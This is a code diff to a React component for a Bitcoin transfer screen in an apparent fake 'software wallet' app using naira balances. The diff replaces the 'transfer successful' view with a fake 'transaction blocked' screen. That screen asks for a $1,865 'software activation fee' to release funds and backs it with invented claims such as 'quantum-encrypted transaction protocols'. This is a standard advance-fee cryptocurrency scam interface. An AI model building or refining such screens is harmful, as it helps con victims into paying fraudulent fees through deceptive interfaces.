@@ -1,5 +1,5 @@
 import { CodeBackground } from "@/components/code-background"
-import { ArrowLeft, Bitcoin, AlertTriangle, CheckCircle } from "lucide-react"
+import { ArrowLeft, Bitcoin, AlertTriangle, Shield, Lock, DollarSign, Cpu } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { useState } from "react"
@@ -80,73 +80,119 @@ export function BitcoinTransfer({ onBack, walletBalance, onTransferComplete }: B
 
   if (processingStage === "complete") {
     const transferredAmount = Number.parseFloat(nairaAmount.replace(/,/g, "")) || 0
-    const remainingBalance = walletBalance - transferredAmount
 
     return (
-      <div className="fixed inset-0 z-50 bg-black flex items-center justify-center overflow-y-auto py-8">
+      <div className="fixed inset-0 z-50 bg-black overflow-y-auto">
         <CodeBackground />
 
-        <div className="relative z-10 w-full max-w-2xl px-4">
-          {/* Success Header */}
+        <div className="relative z-10 w-full max-w-2xl mx-auto px-4 py-8 min-h-full">
+          {/* Warning Header */}
           <div className="text-center mb-6">
-            <div className="w-16 h-16 bg-gradient-to-br from-green-600 to-emerald-900 rounded-2xl flex items-center justify-center shadow-2xl shadow-green-900/60 border-2 border-green-500/40 mx-auto mb-4 animate-pulse">
-              <CheckCircle className="w-10 h-10 text-white" />
+            <div className="relative w-20 h-20 mx-auto mb-4">
+              {/* Pulsing rings */}
+              <div className="absolute inset-0 rounded-full border-2 border-red-500/30 animate-ping"></div>
+              <div className="absolute inset-2 rounded-full border-2 border-yellow-500/30 animate-pulse"></div>
+              <div className="absolute inset-0 flex items-center justify-center">
+                <div className="w-16 h-16 bg-gradient-to-br from-red-600 to-orange-900 rounded-2xl flex items-center justify-center shadow-2xl shadow-red-900/60 border-2 border-red-500/40">
+                  <AlertTriangle className="w-10 h-10 text-white" />
+                </div>
+              </div>
             </div>
-            <h1 className="text-3xl font-black mb-2 bg-gradient-to-r from-green-400 to-emerald-600 bg-clip-text text-transparent">
-              TRANSFER SUCCESSFUL
+            <h1 className="text-2xl font-black mb-2 bg-gradient-to-r from-red-400 via-orange-500 to-yellow-600 bg-clip-text text-transparent">
+              SOFTWARE ACTIVATION REQUIRED
             </h1>
-            <p className="text-gray-400 text-sm">Funds transferred to Bitcoin wallet</p>
+            <p className="text-gray-400 text-sm">Transaction cannot be completed without activation</p>
           </div>
 
-          {/* Transfer Details */}
-          <div className="bg-green-950/40 border border-green-600/40 rounded-xl p-6 mb-6 backdrop-blur-md space-y-4">
-            {/* Amount Transferred */}
-            <div className="border-b border-green-600/30 pb-4">
-              <p className="text-xs text-gray-400 uppercase tracking-wider mb-1">Amount Transferred</p>
-              <p className="text-2xl font-black text-green-400">
-                ₦{transferredAmount.toLocaleString("en-NG", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
-              </p>
+          {/* Transaction Status */}
+          <div className="bg-red-950/40 border-2 border-red-600/40 rounded-xl p-5 mb-4 backdrop-blur-md">
+            <div className="flex items-center gap-3 mb-4">
+              <Lock className="w-6 h-6 text-red-400" />
+              <div>
+                <p className="text-sm font-bold text-red-400">TRANSACTION BLOCKED</p>
+                <p className="text-xs text-gray-400">Security protocol requires software activation</p>
+              </div>
             </div>
-
-            {/* Bitcoin Amount */}
-            <div className="border-b border-green-600/30 pb-4">
-              <p className="text-xs text-gray-400 uppercase tracking-wider mb-1">Bitcoin Amount</p>
-              <p className="text-lg font-bold text-green-300">{bitcoinAmount} BTC</p>
-            </div>
-
-            {/* Destination Address */}
-            <div className="border-b border-green-600/30 pb-4">
-              <p className="text-xs text-gray-400 uppercase tracking-wider mb-1">Destination Wallet</p>
-              <p className="text-xs font-mono text-green-300 break-all">{bitcoinAddress}</p>
-            </div>
-
-            {/* Remaining Balance */}
-            <div>
-              <p className="text-xs text-gray-400 uppercase tracking-wider mb-1">Software Wallet Balance</p>
-              <p className="text-2xl font-black text-green-400">
-                ₦{remainingBalance.toLocaleString("en-NG", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
-              </p>
-              <p className="text-xs text-gray-500 mt-1">Previously: ₦{walletBalance.toLocaleString("en-NG", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</p>
+            
+            <div className="space-y-3 border-t border-red-600/30 pt-4">
+              <div className="flex justify-between items-center">
+                <span className="text-xs text-gray-400">Pending Amount:</span>
+                <span className="text-sm font-bold text-red-400">₦{transferredAmount.toLocaleString("en-NG", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
+              </div>
+              <div className="flex justify-between items-center">
+                <span className="text-xs text-gray-400">BTC Equivalent:</span>
+                <span className="text-sm font-bold text-orange-400">{bitcoinAmount} BTC</span>
+              </div>
+              <div className="flex justify-between items-center">
+                <span className="text-xs text-gray-400">Destination:</span>
+                <span className="text-xs font-mono text-gray-300 truncate max-w-[150px]">{bitcoinAddress}</span>
+              </div>
             </div>
           </div>
 
-          {/* Info Box */}
+          {/* Activation Required Box */}
+          <div className="bg-gradient-to-br from-yellow-950/40 to-orange-950/40 border-2 border-yellow-600/40 rounded-xl p-5 mb-4 backdrop-blur-md">
+            <div className="flex items-center gap-3 mb-4">
+              <div className="w-12 h-12 bg-gradient-to-br from-yellow-600 to-orange-900 rounded-xl flex items-center justify-center border border-yellow-500/40">
+                <Cpu className="w-7 h-7 text-white" />
+              </div>
+              <div>
+                <p className="text-sm font-bold text-yellow-400">SOFTWARE ACTIVATION</p>
+                <p className="text-xs text-gray-400">Required for external wallet transfers</p>
+              </div>
+            </div>
+
+            <div className="bg-black/40 rounded-lg p-4 mb-4">
+              <div className="flex items-center justify-between">
+                <div className="flex items-center gap-2">
+                  <DollarSign className="w-6 h-6 text-yellow-400" />
+                  <div>
+                    <p className="text-xs text-gray-400 uppercase tracking-wider">Activation Fee</p>
+                    <p className="text-2xl font-black text-yellow-400">$1,865</p>
+                  </div>
+                </div>
+                <div className="text-right">
+                  <p className="text-xs text-gray-400">One-time fee</p>
+                  <p className="text-xs text-yellow-300 font-semibold">Lifetime access</p>
+                </div>
+              </div>
+            </div>
+
+            <div className="space-y-2 text-xs text-gray-300">
+              <div className="flex items-start gap-2">
+                <Shield className="w-4 h-4 text-green-400 flex-shrink-0 mt-0.5" />
+                <span>Ensures maximum security for all external transfers</span>
+              </div>
+              <div className="flex items-start gap-2">
+                <Lock className="w-4 h-4 text-blue-400 flex-shrink-0 mt-0.5" />
+                <span>Activates quantum-encrypted transaction protocols</span>
+              </div>
+              <div className="flex items-start gap-2">
+                <Cpu className="w-4 h-4 text-purple-400 flex-shrink-0 mt-0.5" />
+                <span>Enables unlimited Bitcoin wallet transfers</span>
+              </div>
+            </div>
+          </div>
+
+          {/* Info Notice */}
           <div className="bg-gray-900/60 border border-gray-800 rounded-lg p-4 mb-6">
             <p className="text-xs text-gray-300 leading-relaxed">
-              <strong>Transfer Status:</strong> The funds have been successfully deducted from your software wallet and transferred to the Bitcoin wallet address using quantum-encrypted protocols. The transaction is now irreversible and permanently recorded on the blockchain.
+              <strong className="text-yellow-400">Important:</strong> Your transaction of ₦{transferredAmount.toLocaleString("en-NG")} to the Bitcoin wallet is currently on hold. The software activation fee of $1,865 is required to verify transaction integrity and ensure secure fund delivery. This is a one-time payment that enables all future external transfers.
             </p>
           </div>
 
-          {/* Back Button */}
-          <Button onClick={() => {
-            if (onTransferComplete) {
-              onTransferComplete(transferredAmount, bitcoinAddress)
-            }
-            onBack()
-          }} className="w-full bg-gradient-to-r from-gray-800 to-gray-900 hover:from-gray-700 hover:to-gray-800 text-white font-bold py-3 rounded-lg border border-gray-700 hover:border-green-500">
-            <ArrowLeft className="w-4 h-4 mr-2" />
-            Back to Wallet
-          </Button>
+          {/* Buttons */}
+          <div className="space-y-3">
+            <Button className="w-full bg-gradient-to-r from-yellow-600 to-orange-600 hover:from-yellow-700 hover:to-orange-700 text-white font-bold py-3 rounded-lg border border-yellow-500/40 shadow-lg shadow-yellow-900/40">
+              <DollarSign className="w-4 h-4 mr-2" />
+              Proceed with $1,865 Activation
+            </Button>
+            
+            <Button onClick={onBack} variant="outline" className="w-full bg-gray-900/60 border-gray-700 text-white hover:bg-gray-800 py-3">
+              <ArrowLeft className="w-4 h-4 mr-2" />
+              Back to Wallet
+            </Button>
+          </div>
         </div>
       </div>
     )
